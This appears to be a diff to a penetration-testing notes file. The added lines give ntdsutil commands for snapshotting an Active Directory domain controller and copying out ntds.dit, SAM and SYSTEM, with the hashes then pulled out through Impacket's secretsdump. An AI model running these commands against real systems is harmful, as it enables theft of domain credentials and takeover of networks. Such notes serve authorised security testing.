@@ -4,6 +4,21 @@
 
 ```
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+-- or --
+
+ntdsutil
+> snapshot
+> activate instance ntds
+> create
+> mount {GUID}
+```
+
+Then browse to the mounted directory in the C:/  and copy out the ntds.dit && SAM & SYSTEM file to your prefered location
+
+To delete the snapshot after:
+
+```
+delete {GUID}
 ```
 
 Then pull the hashes out with Impacket's Secretdump
